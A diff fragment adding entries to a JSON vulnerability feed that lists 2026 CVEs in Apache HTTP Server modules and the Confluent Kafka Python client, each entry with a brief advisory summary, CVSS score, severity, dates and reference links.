+      "summary": "Integer overflow in mod_dav_fs in Apache HTTP Server through 2.4.68 allows an authenticated WebDAV client with write access to crash worker processes and persistently corrupt a directory's property database via PROPPATCH requests declaring many XML namespaces.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-93546",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/30"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-57941",
+      "summary": "Use After Free vulnerability in Apache HTTP Server's mod_http2 via shared session->bbtmp re-entrancy\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-57941",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/19"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-15911",
+      "summary": "Confluent Kafka Python client's HashiCorp Vault KMS integration could allow a remote attacker to obtain sensitive information due to improper TLS certificate validation.",
+      "cvssScore": 5.8,
+      "severity": "Medium",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-15911",
+        "https://support.confluent.io/hc/en-us/articles/54133146724244-CONFSA-2026-22-CVE-2026-15911-Confluent-Kafka-Python-Client-Vulnerability-TLS-Certificate-verification-disabled-by-default-in-HashiCorp-Vault-KMS-Integration"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-59685",
+      "summary": "Out-of-bounds Write vulnerability in Apache HTTP Server on Windows while processing paths with 8.3 names that may grow when expanded.\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-59685",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/21"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-59797",
+      "summary": "Improper Privilege Management vulnerability in Apache HTTP Server's mod_ssl via SSLRequire and file-related expressions.\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-59797",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/22"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-58415",
+      "summary": "Internal state files accessible to external parties in mod_dav_fs in Apache Software Foundation Apache HTTP Server before 2.4.69 on all platforms allows a remote client to read WebDAV dead properties of resources it cannot author via a GET request for the .DAV state directory\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-58415",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/20"
+      ],
       "vulnerableProducts": [],
       "isExploited": false
     }
